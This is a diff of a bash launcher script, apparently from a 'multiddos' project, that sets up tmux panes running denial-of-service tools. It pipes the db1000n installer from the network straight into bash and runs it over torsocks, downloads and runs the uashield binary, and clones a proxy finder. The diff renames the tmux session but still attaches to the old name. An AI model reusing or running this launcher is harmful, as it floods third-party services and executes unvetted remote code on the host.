@@ -1,6 +1,6 @@
 #!/bin/bash
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.5d\n"
+clear && echo -e "Loading... v0.5e\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -71,33 +71,33 @@ sudo pkill node shield> /dev/null 2>&1
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf > /dev/null 2>&1
 
-echo "1111"; sleep 1
-
 if [[ $gotop == "on" ]]; then
     if [ ! -f "/usr/local/bin/gotop" ]; then
         curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
         sudo dpkg -i gotop.deb
     fi
-    tmux new-session -s multidd 'gotop -sc solarized'
+    tmux new-session -s multiddos -d 'gotop -sc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
-    tmux new-session -s multidd 'bash auto_bash.sh'
+    sleep 0.2
+    tmux new-session -s multiddos -d 'bash auto_bash.sh'
 fi
-
-echo "2222"; sleep 3
 
 if [[ $vnstat == "on" ]]; then
     sudo apt -yq install vnstat
+    sleep 0.2
     tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
     sudo apt -yq install torsocks
+    sleep 0.2
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
 if [[ $uashield == "on" ]]; then
+    sleep 0.2
     tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
@@ -105,10 +105,10 @@ if [[ $proxy_finder == "on" ]]; then
     #sleep 0.2
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
-echo "3333"; sleep 3
-#tmux attach-session -t multidd
+
+
+tmux attach-session -t multidd
 #tmux a
-echo "4444"; sleep 3
 
 }
 
